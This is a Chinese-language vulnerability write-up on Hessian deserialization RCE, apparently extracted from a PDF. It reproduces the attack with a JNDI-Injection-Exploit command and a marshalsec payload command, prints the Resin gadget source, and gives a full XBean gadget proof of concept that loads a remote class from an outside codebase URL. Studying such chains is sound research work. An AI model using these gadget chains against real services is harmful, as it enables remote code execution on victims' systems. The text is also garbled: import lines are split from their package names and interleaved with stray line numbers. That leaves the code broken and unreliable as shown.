S-hessian反序列化
介绍
自己不会查吗?
这里有一个点就是Hessian的序列化与反序列化与原生序列化与反序列化不同，就以使用的Resin链而言，其中的ja
vax.naming.spi.ContinuationDirContext类并没有实现java.io.Serializable接口，但是hessian还是可以
正常对他进行序列化，用原生的序列化方式就会失败。区别就在于序列化对象时的一个设置，可以让未继承java.i
o.Serializable接口的类进行序列化。
使用
hessian的使用有很多场景，也结合了 servlet和 spring，这里的使用先使用自行封装，然后调试分析漏洞成因，
最后再看整合后的集中情况。
        com.caucho 
        hessian 
        4.0.38 
        com.caucho 
        resin 
        4.0.63 
        provided 
        com.caucho 
        quercus 
        4.0.66 
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
package 
; 
import 
HessianInput;
import 
HessianOutput;
import 
Dao.User; 
import 
*;
import 
ArrayList;
import 
Logger; 
public class HessionUtils { 
    private static byte[] serialize(Object object){ 
        try { 
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); 
            HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream); 
            hessianOutput.writeObject(object); 
            return byteArrayOutputStream.toByteArray(); 
        }catch (Exception e) { 
            e.printStackTrace(); 
            return null; 
        } 
    } 
    private static Object deserialize(byte[] bytes){ 
        try { 
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); 
            HessianInput hessianInput = new HessianInput(byteArrayInputStream); 
            Object o = hessianInput.readObject(); 
            return o; 
        }catch (Exception e){ 
            e.printStackTrace(); 
        } 
        return null; 
    } 
    public static void main(String[] args) { 
        User zhangsan = new User("zhangsan", 20, true); 
        byte[] serialize = serialize(zhangsan); 
        System.out.println(new String(serialize)); 
        User deserialize =(User) deserialize(serialize); 
        String s = deserialize.toString(); 
        System.out.println(s); 
        System.out.println("*******************int类型*****************"); 
        int age = 100; 
        byte[] ageSrial = serialize(age); 
        System.out.println(new String(ageSrial)); 
        int ageUnserial =(int) deserialize(ageSrial); 
        System.out.println(ageUnserial); 
        System.out.println("*******************String类型*****************"); 
        String name="lisi"; 
        byte[] nameSerial = serialize(name); 
        System.out.println(new String(nameSerial)); 
com.example
com.caucho.hessian.io.
com.caucho.hessian.io.
com.example.
java.io.
java.util.
java.util.logging.
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
        String nameUnserial =(String) deserialize(nameSerial); 
        System.out.println(nameUnserial); 
        System.out.println("*******************arraylist类型*****************"); 
        ArrayList strings = new ArrayList<>(); 
        strings.add("test");strings.add("demo"); 
        byte[] listSeria = serialize(strings); 
        System.out.println(new String(listSeria)); 
        ArrayList listUnserial= (ArrayList)deserialize(listSeria); 
        System.out.println(listUnserial); 
        // 
        String filePath="D:\\java\\project\\serial\\marshalsec-master\\target\\hession"; 
        byte[] bytes = fileToBytes(filePath); 
        Object deserialize1 = deserialize(bytes); 
        //com.caucho.hessian.server.HessianServlet 
    } 
    public static byte[] fileToBytes(String filePath) { 
        byte[] buffer = null; 
        File file = new File(filePath); 
        FileInputStream fis = null; 
        ByteArrayOutputStream bos = null; 
        try { 
            fis = new FileInputStream(file); 
            bos = new ByteArrayOutputStream(); 
            byte[] b = new byte[1024]; 
            int n; 
            while ((n = fis.read(b)) != -1) { 
                bos.write(b, 0, n); 
            } 
            buffer = bos.toByteArray(); 
        } catch (FileNotFoundException ex) { 
        } catch (IOException ex) { 
        } finally { 
            try { 
                if (null != bos) { 
                    bos.close(); 
                } 
            } catch (IOException ex) { 
            } finally{ 
                try { 
                    if(null!=fis){ 
                        fis.close(); 
                    } 
                } catch (IOException ex) { 
                } 
            } 
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
漏洞复现
启动JNDI服务：
JNDI-Injection-Exploit：java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C calc.exe -A 127.
0.0.1
生成payload
hessian的payload需要使用marshalsec来生成。marshalsec：java.exe -cp .\marshalsec-0.0.3-SNAPSHOT-
all.jar marshalsec.Hessian Resin http://127.0.0.1:8180/ ExecTemplateJDK7 >>hession
        } 
        return buffer; 
    }
}
110
111
112
113
114
反序列化
漏洞分析
payload生成
marshalsec.gadgets.Resin#makeResinQName()
package 
; 
import 
Constructor;
import 
Hashtable;
import 
CannotProceedException;
import 
Reference;
import 
DirContext;
import 
QName;
import 
MarshallerBase;
import 
UtilFactory;
import 
Reflections; 
public interface Resin extends Gadget { 
marshalsec.gadgets
java.lang.reflect.
java.util.
javax.naming.
javax.naming.
javax.naming.directory.
com.caucho.naming.
marshalsec.
marshalsec.
marshalsec.util.
1
2
3
4
5
6
7
8
9
10
11
12
13
    @Args ( minArgs = 2, args = { 
        "codebase", "class" 
    }, defaultArgs = { 
        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass 
    } ) 
    default Object makeResinQName ( UtilFactory uf, String[] args ) throws Exception { 
        Class ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NL
S-1$ 
        Constructor ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, H
ashtable.class); 
        ccCons.setAccessible(true); 
        CannotProceedException cpe = new CannotProceedException(); 
        Reflections.setFieldValue(cpe, "cause", null); 
        Reflections.setFieldValue(cpe, "stackTrace", null); 
        cpe.setResolvedObj(new Reference("Foo", args[ 1 ], args[ 0 ])); 
        Reflections.setFieldValue(cpe, "suppressedExceptions", null); 
        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>()); 
        QName qName = new QName(ctx, "foo", "bar"); 
        return uf.makeToStringTriggerStable(qName); 
    }
}
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
这个payload的生成首先关注一下返回的东西，其余的在调试漏洞触发的时候再同步来看。首先是这个返回值，调用
了uf.makeToStringTriggerStable(qName)，然后跟入这个方法，会创建一个xstring对象，然后最终返回的对象
是一个hashmap，第一个属性是QName，第二个是XString。
漏洞调试->Resin链
hessianInput.readObject()->this._serializerFactory.readMap(this, type)
对于hessian而言会根据不同的类型来选择反序列化的工厂，然后因为我们的payload最后返回的是一个hashmap，
所以根据程序逻辑会进入到this._serializerFactory.readMap(this, type)，然后又进入到this._hashMapDe
serializer.readMap(in)在MapDeserializer.readMap()方法中会对序列化的两个参数反序列化然后重新存入ma
p中。首先存入Qname这个对象，然后第二次存入XString对象的时候会与Qname对象进行比较，然后触发漏洞。
hashmap.putval->Xstring.equals(Qname)->Qname.toString()
通过hashmap中键值的比较，最终进入到Qname.toString()方法当中。这里我们就要回到之前payload的构造了，
来看看Qname的一些属性设置。
default Object makeResinQName ( UtilFactory uf, String[] args ) throws Exception { 
        Class ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NL
S-1$ 
        Constructor ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, H
ashtable.class); 
        ccCons.setAccessible(true); 
        CannotProceedException cpe = new CannotProceedException(); 
        Reflections.setFieldValue(cpe, "cause", null); 
        Reflections.setFieldValue(cpe, "stackTrace", null); 
        cpe.setResolvedObj(new Reference("Foo", args[ 1 ], args[ 0 ])); 
1
2
3
4
5
6
7
8
9
10
11
        Reflections.setFieldValue(cpe, "suppressedExceptions", null); 
        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>()); 
        QName qName = new QName(ctx, "foo", "bar"); 
        return uf.makeToStringTriggerStable(qName); 
    }
12
13
14
15
16
通过payload的构造可以看到this._context属性应该是(DirContext)javax.naming.spi.ContinuationDirCon
text对象，那么Qname.toString()方法中this._context.composeName(str, name)对应的就是(DirContext)j
avax.naming.spi.ContinuationDirContext.composeName("bar","foo")，最终进入的就是ContinuationCon
text.composeName("bar","foo")，根据继承关系，在ContinuationContext类中实现了composeName方法。
ContinuationContext.composeName("bar","foo")->getTargetContext()->NamingManager.getContext(cpe.getR
esolvedObj(),cpe.getAltName(),cpe.getAltNameCtx(),env)->NamingManager.getObjectInstance->NamingMana
ger.getObjectFactoryFromReference()->helper.loadClass(factoryName, codebase)->URLClassLoader.newIns
tance(getUrlArray(codebase), parent)
根据上面的调用链可以追踪到整个调用过程，最终是通过urlclassLoader来加载远程的远程类，最终触发RCE
漏洞调试->ROME链
漏洞调试->XBean链
package 
; 
import 
ToStringUtil;
import 
ContextUtil;
import 
WritableContext;
import 
XString; 
import 
Context;
import 
NamingException;
import 
Reference;
import 
Method;
import 
HashMap; 
public class XBeanGa { 
    public static void main(String[] args) throws Exception { 
        WritableContext writableContext = new WritableContext(); 
        Reference reference = new Reference("test", "ExecTemplateJDK7", "http://192.168.1.1
1:8180/"); 
com.example
marshalsec.gadgets.
org.apache.xbean.naming.context.
org.apache.xbean.naming.context.
org.apache.xpath.objects.
javax.naming.
javax.naming.
javax.naming.
java.lang.reflect.
java.util.
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
XBean的构造链和Resin的链是一样的原理，都是通过XString.equals(readOnlyBinding)->Binding(ReadOnlyB
inding继承Binding类且自身没有实现toString方法).toString()->ReadOnlyBinding.getObject()->Context
Util.resolve(this.value, this.getName(), (Name)null, this.context)->NamingManager.getObjectIn
stance(reference, parsedName, nameCtx, nameCtx.getEnvironment())->......
利用限制
        ContextUtil.ReadOnlyBinding readOnlyBinding = new ContextUtil.ReadOnlyBinding("",re
ference,writableContext); 
        XString string = new XString("string"); 
        HashMap map = new HashMap(); 
        // 放入 readOnlyBinding 移除 putVal 的影响 
        map.put(readOnlyBinding, "su18"); 
        Method[] m = Class.forName("java.util.HashMap").getDeclaredMethods(); 
        for (Method method : m) { 
            if ("putVal".equals(method.getName())) { 
                method.setAccessible(true); 
                method.invoke(map, -1, readOnlyBinding, 0, false, true); 
            } 
        } 
        // 放入 XString 移除 putVal 的影响，不然hashmap之后的排序一直存在问题，XString的顺序一定
要在readOnlyBinding之后 
        map.put(string, "su19"); 
        Method[] m2 = Class.forName("java.util.HashMap").getDeclaredMethods(); 
        for (Method method : m2) { 
            if ("putVal".equals(method.getName())) { 
                method.setAccessible(true); 
                method.invoke(map, -1, string, 0, false, true); 
            } 
        } 
        byte[] serialize = HessionUtils.serialize(map); 
        Object deserialize = HessionUtils.deserialize(serialize); 
    } 
}
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
参考文章
su18-hessian反序列化
Hessian反序列化漏洞
Hessian反序列化RCE漏洞复现及分析